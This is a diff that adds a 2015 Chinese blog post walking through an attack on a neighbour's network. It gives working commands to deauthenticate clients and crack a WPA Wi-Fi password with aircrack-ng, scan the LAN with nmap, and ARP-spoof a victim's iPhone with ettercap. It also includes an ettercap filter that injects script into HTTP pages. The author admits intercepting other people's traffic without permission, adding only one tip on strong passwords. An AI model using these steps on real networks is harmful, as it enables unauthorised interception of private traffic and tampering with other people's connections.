@@ -1,0 +1,734 @@
+<!doctype html>
+<html class="theme-next   use-motion ">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="linux,wifi," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Yqf's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.2" />
+
+
+
+
+
+
+<meta name="description" content="0x00 折腾的缘由不知什么时候看到这篇文章后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。
+首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。
+然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="尝试“偷窥”邻居的网络流量">
+<meta property="og:url" content="http://yqf3139.github.io/2015/12/25/try-to-snoop-using-wifi/index.html">
+<meta property="og:site_name" content="Yqf's Blog">
+<meta property="og:description" content="0x00 折腾的缘由不知什么时候看到这篇文章后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。
+首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。
+然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/searching.png">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/waiting-for-handshake.png">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/get-handshake.png">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/get-passwd.png">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/wireshark.png">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/v2ex.jpg">
+<meta property="og:image" content="http://yqf3139.github.io/images/try-to-snoop-using-wifi/smzdm.jpg">
+<meta property="og:updated_time" content="2015-12-25T13:18:38.851Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="尝试“偷窥”邻居的网络流量">
+<meta name="twitter:description" content="0x00 折腾的缘由不知什么时候看到这篇文章后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。
+首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。
+然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    sidebar: 'post',
+    motion: true
+  };
+</script>
+
+  <title> 尝试“偷窥”邻居的网络流量 | Yqf's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Yqf's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">Day day up.</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                尝试“偷窥”邻居的网络流量
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            Posted on
+            <time itemprop="dateCreated" datetime="2015-12-25T19:35:34+08:00" content="2015-12-25">
+              2015-12-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; In
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2015/12/25/try-to-snoop-using-wifi/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/25/try-to-snoop-using-wifi/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><h1 id="0x00__u6298_u817E_u7684_u7F18_u7531"><a href="#0x00__u6298_u817E_u7684_u7F18_u7531" class="headerlink" title="0x00 折腾的缘由"></a>0x00 折腾的缘由</h1><p>不知什么时候看到<a href="http://lcx.cc/?i=4257" target="_blank" rel="external">这篇文章</a>后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。</p>
+<p>首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。</p>
+<p>然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏览器弹窗、修改网页布局的效果。</p>
+<p>这简单的实现可以使用古老但好用的<a href="www.zhihu.com/question/20338649">ARP攻击</a>，将目标的流量欺骗到攻击人的网卡上，便可以开展中间人攻击了。不过这要求我们在同一个局域网中，比如连接了同一个无线路由器。一般可以搜索到邻居的无线路由器，一旦破解了其登陆密码，便可以扫描到目标的设备，进行攻击了。</p>
+<h1 id="0x01__u5C1D_u8BD5_u7834_u89E3Wifi"><a href="#0x01__u5C1D_u8BD5_u7834_u89E3Wifi" class="headerlink" title="0x01 尝试破解Wifi"></a>0x01 尝试破解Wifi</h1><p>一般我们的设备和邻居的设备不在同一内网中，所以第一难关就是攻克无线路由器。如果像我一样，插上网线发现就已经和邻居在同一内网中，那么就可以跳过这一步了。</p>
+<h2 id="u4F7F_u7528_u7684_u6B66_u5668"><a href="#u4F7F_u7528_u7684_u6B66_u5668" class="headerlink" title="使用的武器"></a>使用的武器</h2><p><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack-ng</a>是常用的用于破解无线802.11WEP及WPA-PSK加密的工具。Linux用户下载源码编译安装即可。<br>其中需要Ubuntu用户预先<code>apt-get install libnl-3-dev libnl-genl-3-dev</code>安装几个依赖。</p>
+<p>Mercury 150Mbps MW150U是一个无线USB网卡，Ubuntu免驱使用，由于可以开启Monitor模式，既可以用于台式机的无线上网，也可以偶尔做做无线网络的实验。</p>
+<p>查看网卡后发现我的笔记本网卡和USB网卡都可以用于实验：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">phy0    wlan0       ath9k       Qualcomm Atheros AR9285 Wireless Network</span><br><span class="line">phy1    wlan1       rt2800usb   Ralink Technology, Corp. RT5370</span><br><span class="line"></span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
+<h2 id="u9009_u62E9_u653B_u51FB_u76EE_u6807"><a href="#u9009_u62E9_u653B_u51FB_u76EE_u6807" class="headerlink" title="选择攻击目标"></a>选择攻击目标</h2><p>一切就绪，首先让网卡进入Monitor模式，这运行程序获取到更底层的无线网络数据，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan1</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
+<p><code>ifconfig</code>后发现<code>wlan1mon</code>。</p>
+<p>继续开始审查周围的无线网络，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan0</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/try-to-snoop-using-wifi/searching.png" alt="search"></p>
+<p>可以看到周边的无线热点，按照信号强度由强到弱排序，其中<code>BSSID</code>是热点的Mac地址，<code>CH</code>是热点的信道（WIFI2.4Ghz分有13个互相有重叠的信道），<code>ENC</code>是加密方式，可以发现基本都是WPA2加密，<code>ESSID</code>是名称，好了，我们基本就只需要关注这些。</p>
+<p>挑选一个victim，记下它的信息。</p>
+<h2 id="u6355_u83B7WPA_u7684_u63E1_u624B_u5305"><a href="#u6355_u83B7WPA_u7684_u63E1_u624B_u5305" class="headerlink" title="捕获WPA的握手包"></a>捕获WPA的握手包</h2><p>要想破解无线密码，我们先捕捉两台设备成功握手的包。虽然其中也不含密码，但我们可以用这一信息来暴力验证密码字典中的密码是否正确。</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">sudo</span> <span class="comment">airodump</span><span class="literal">-</span><span class="comment">ng</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ivs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ignore</span><span class="literal">-</span><span class="comment">negative</span><span class="literal">-</span><span class="comment">one</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">bssid</span> <span class="comment">目标热点MAC</span> <span class="literal">-</span><span class="comment">w</span> <span class="comment">保存文件的名称</span> <span class="literal">-</span><span class="comment">c</span> <span class="comment">信道</span> <span class="comment">wlan1mon</span></span><br><span class="line"><span class="comment">```</span></span><br></pre></td></tr></table></figure>
+<p>现在我们看到开始抓包，</p>
+<p><img src="/images/try-to-snoop-using-wifi/waiting-for-handshake.png" alt="waiting-for-handshake"></p>
+<p>不过是否能快速捕获握手包取决于两个因素，信号强弱、是否现在有活跃的设备正在和热点通信。为了尽快获取到握手包，常规做法是广播中断连接的信号，强制踢设备下线，再连接就有我们想要的握手包了。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -<span class="number">0</span> <span class="number">30</span> -<span class="literal">a</span> 目标热点MAC  wlan1mon</span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
+<p>幸运地话，很快就能看到握手包捕捉成功，</p>
+<p><img src="/images/try-to-snoop-using-wifi/get-handshake.png" alt="get-handshake"></p>
+<h2 id="u79BB_u7EBF_u7834_u89E3_uFF0C_u62FC_u7B97_u529B_u7684_u65F6_u5019_u5230_u4E86"><a href="#u79BB_u7EBF_u7834_u89E3_uFF0C_u62FC_u7B97_u529B_u7684_u65F6_u5019_u5230_u4E86" class="headerlink" title="离线破解，拼算力的时候到了"></a>离线破解，拼算力的时候到了</h2><p>目前WPA的加密是捕获热点和设备间的握手信息，再离线用密码字典爆破，按理来说都是可以破解的，不过时间不允许我们这么做，由于一般密码很弱，比如8位纯数字，或者是非常常见，如password。一个好的字典囊括了最常见的密码，让我们能瞬间破解很多热点。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w ~/Downloads/dict/<span class="number">0</span>-<span class="number">9.8</span>位纯数密码<span class="class">.txt</span> my-<span class="number">01</span><span class="class">.ivs</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>4T 2.2GHz的破解速度只有90000个/秒的破解速度，把0-9的8位纯数密码扫描一遍要1000分钟了。</p>
+<p>不过常见密码是很好破解的，</p>
+<p><img src="/images/try-to-snoop-using-wifi/get-passwd.png" alt="get-passwd"></p>
+<p>所以，<strong>一定要把无线密码设置得非常特殊，长度12位以上，切记切记</strong>，还有防止软件偷走密码去分享。</p>
+<h1 id="0x02__u626B_u63CF_u5185_u7F51_u8BBE_u5907"><a href="#0x02__u626B_u63CF_u5185_u7F51_u8BBE_u5907" class="headerlink" title="0x02 扫描内网设备"></a>0x02 扫描内网设备</h1><p>成功登入后，首要访问一下<code>192.168.1.1</code>或<code>192.168.1.253</code>，这是路由器管理界面的常见入口，比如我登的就是admin/admin口令，控制了路由器就更加自由了。可以进行DNS攻击，刷路由器固件等。</p>
+<p>如何在不登陆路由器管理界面的情况下，看看内网内的其他设备的情况呢？nmap登场，神级工具之前一直没用过，最近才看到其他人使用。</p>
+<p>简单用法如下，更多请参阅<a href="http://blog.csdn.net/zmj_88888888/article/details/9138399" target="_blank" rel="external">他人的简单的教程</a><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  <span class="tag">nmap</span> <span class="tag">-sP</span> 192<span class="class">.168</span><span class="class">.1</span><span class="class">.1-254</span></span><br><span class="line"></span><br><span class="line"><span class="tag">Nmap</span> <span class="tag">scan</span> <span class="tag">report</span> <span class="tag">for</span> <span class="tag">xxxxxxxdeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>)</span><br><span class="line"><span class="tag">Host</span> <span class="tag">is</span> <span class="tag">up</span> (0<span class="class">.031s</span> <span class="tag">latency</span>).</span><br><span class="line"><span class="tag">All</span> 100 <span class="tag">scanned</span> <span class="tag">ports</span> <span class="tag">on</span> <span class="tag">feixiandeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>) <span class="tag">are</span> <span class="tag">closed</span></span><br><span class="line"><span class="tag">MAC</span> <span class="tag">Address</span>: <span class="tag">XX</span><span class="pseudo">:XX</span><span class="pseudo">:XX</span><span class="pseudo">:XX</span><span class="pseudo">:XX</span> (<span class="tag">Apple</span>)</span><br><span class="line"><span class="tag">Too</span> <span class="tag">many</span> <span class="tag">fingerprints</span> <span class="tag">match</span> <span class="tag">this</span> <span class="tag">host</span> <span class="tag">to</span> <span class="tag">give</span> <span class="tag">specific</span> <span class="tag">OS</span> <span class="tag">details</span></span><br><span class="line"><span class="tag">Network</span> <span class="tag">Distance</span>: 1 <span class="tag">hop</span></span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
+<p>哈，发现一个人的iPhone。</p>
+<h1 id="0x03__u7B80_u5355_u8FDB_u884CArp_u653B_u51FB"><a href="#0x03__u7B80_u5355_u8FDB_u884CArp_u653B_u51FB" class="headerlink" title="0x03 简单进行Arp攻击"></a>0x03 简单进行Arp攻击</h1><p>现在，真正的攻击上演了。我们要将上面找到的victim的流量欺骗到我们的网卡上，<a href="https://ettercap.github.io/ettercap/" target="_blank" rel="external">ettercap</a>登场，<code>apt-get</code>安装即可。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan1 -T -M arp:remote /<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="comment">// /192.168.1.7//</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>执行中间人攻击，欺骗路由器和目标设备，这样本来由目标发下路由器的流量就发给了我方网卡，中转后再发向路由器。</p>
+<h1 id="0x04__u5BA1_u67E5_u6D41_u91CF_u4FE1_u606F"><a href="#0x04__u5BA1_u67E5_u6D41_u91CF_u4FE1_u606F" class="headerlink" title="0x04 审查流量信息"></a>0x04 审查流量信息</h1><p>配合<code>wireshark</code>审查浏览，不过现在HTTPS加密已经流行起来，似乎只有HTTP明文可以被我们分析了。</p>
+<p><img src="/images/try-to-snoop-using-wifi/wireshark.png" alt="wireshark"></p>
+<p>似乎到了饭点，在定外卖……</p>
+<h1 id="0x05__u4FEE_u6539_u6D41_u91CF_u4FE1_u606F"><a href="#0x05__u4FEE_u6539_u6D41_u91CF_u4FE1_u606F" class="headerlink" title="0x05 修改流量信息"></a>0x05 修改流量信息</h1><p>接下来攻击自己手机，尝试在HTTP明文中注入脚本。</p>
+<p>还是使用<code>ettercap</code>，其中的<code>fliter</code>功能可以进行简单的文本查找和替换，虽然十分低效。高效的方法需要加入HTTP解析，这样方便过滤和注入。</p>
+<p>fliter代码，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.dst == 80) &#123;</span><br><span class="line">    if (search(DATA.data, "Accept-Encoding")) &#123;</span><br><span class="line">        replace("Accept-Encoding", "Accept-Nothing"); # 防止GZIP压缩</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123;</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>", "<span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">\"text</span>/<span class="attribute">javascript</span>\"&gt;</span><span class="actionscript">alert(<span class="string">'Hack'</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>","<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="tag">html</span><span class="rules">&#123;<span class="rule"><span class="attribute">overflow-y</span>:<span class="value">scroll</span></span>;<span class="rule"><span class="attribute">filter</span>:<span class="value">progid:DXImageTransform.Microsoft.<span class="function">BasicImage</span>(grayscale=<span class="number">1</span>)</span></span>;<span class="rule"><span class="attribute">-webkit-filter</span>:<span class="value"><span class="function">grayscale</span>(<span class="number">100%</span>)</span></span>;&#125;</span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>预先编译为<code>ettercap</code>可加载的二进制模块，</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">etterfilter f.filter -o <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p>重新进行攻击，这时候流量被匹配后修改，</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan0 -<span class="constant">T</span> -<span class="constant">M</span> <span class="symbol">arp:</span>remote -<span class="constant">F</span> <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span> /<span class="number">192.168</span>.<span class="number">31.1</span>/<span class="regexp">/ /</span><span class="number">192.168</span>.<span class="number">31.155</span>/<span class="regexp">/</span><br><span class="line"></span><br><span class="line">```</span></span><br></pre></td></tr></table></figure>
+<p>攻击效果，</p>
+<p><img src="/images/try-to-snoop-using-wifi/v2ex.jpg" alt="v2ex"></p>
+<p>脚本注入</p>
+<p><img src="/images/try-to-snoop-using-wifi/smzdm.jpg" alt="smzdm"></p>
+<p>哈，灰色默哀</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux/" rel="tag">#linux</a>
+          
+            <a href="/tags/wifi/" rel="tag">#wifi</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/12/21/a-good-logging-habit/" rel="next" title="养成良好的Log习惯">
+                <i class="fa fa-chevron-left"></i> 养成良好的Log习惯
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+        </div>
+
+        
+
+
+        
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2015/12/25/try-to-snoop-using-wifi/"
+           data-title="尝试“偷窥”邻居的网络流量" data-url="http://yqf3139.github.io/2015/12/25/try-to-snoop-using-wifi/">
+      </div>
+    
+  </div>
+
+
+      </div>
+
+      
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/avatar.png" alt="yqf" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">yqf</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description"></p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">34</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-name">categories</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00__u6298_u817E_u7684_u7F18_u7531"><span class="nav-number">1.</span> <span class="nav-text">0x00 折腾的缘由</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01__u5C1D_u8BD5_u7834_u89E3Wifi"><span class="nav-number">2.</span> <span class="nav-text">0x01 尝试破解Wifi</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#u4F7F_u7528_u7684_u6B66_u5668"><span class="nav-number">2.1.</span> <span class="nav-text">使用的武器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#u9009_u62E9_u653B_u51FB_u76EE_u6807"><span class="nav-number">2.2.</span> <span class="nav-text">选择攻击目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#u6355_u83B7WPA_u7684_u63E1_u624B_u5305"><span class="nav-number">2.3.</span> <span class="nav-text">捕获WPA的握手包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#u79BB_u7EBF_u7834_u89E3_uFF0C_u62FC_u7B97_u529B_u7684_u65F6_u5019_u5230_u4E86"><span class="nav-number">2.4.</span> <span class="nav-text">离线破解，拼算力的时候到了</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02__u626B_u63CF_u5185_u7F51_u8BBE_u5907"><span class="nav-number">3.</span> <span class="nav-text">0x02 扫描内网设备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03__u7B80_u5355_u8FDB_u884CArp_u653B_u51FB"><span class="nav-number">4.</span> <span class="nav-text">0x03 简单进行Arp攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04__u5BA1_u67E5_u6D41_u91CF_u4FE1_u606F"><span class="nav-number">5.</span> <span class="nav-text">0x04 审查流量信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05__u4FEE_u6539_u6D41_u91CF_u4FE1_u606F"><span class="nav-number">6.</span> <span class="nav-text">0x05 修改流量信息</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
+            <i class="fa fa-angle-double-down"></i>
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+      
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2009 - 
+  <span itemprop="copyrightYear">2015</span>
+  <span class="with-love">
+    <i class="icon-next-heart fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yqf</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"yqf3139"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+
+
+    
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>
+
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
